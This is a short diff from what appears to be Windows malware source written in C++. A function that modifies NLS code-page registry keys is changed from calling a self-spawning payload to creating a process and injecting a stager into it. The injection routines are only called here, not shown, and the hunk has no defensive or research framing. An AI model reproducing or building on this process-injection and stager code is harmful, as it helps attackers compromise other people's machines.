@@ -294,13 +294,13 @@ bool OpenKeyForNlsModification(PRegistryKey regObject) noexcept
 		std::printf("Could not iterate key for proper modification. Last error: [0x%x]\n", GetLastError());
 		return bResult;
 	}
-	DWORD dwCodePageID = regObject->getCodePageID(CodePageIDIndex::CodePageInt);
-	std::printf("The code page ID is %d\n", dwCodePageID);
-	SelfSpawnPayload(dwCodePageID);
-	//if (CreateProcessToInject(&regObject->m_procInfo))
-	//{
-	//	InjectStagerToPayload(regObject);
-	//}
+	//DWORD dwCodePageID = regObject->getCodePageID(CodePageIDIndex::CodePageInt);
+	//std::printf("The code page ID is %d\n", dwCodePageID);
+	//SelfSpawnPayload(dwCodePageID);
+	if (CreateProcessToInject(&regObject->m_procInfo))
+	{
+		InjectStagerToPayload(regObject);
+	}
 
 	return bResult;
 }
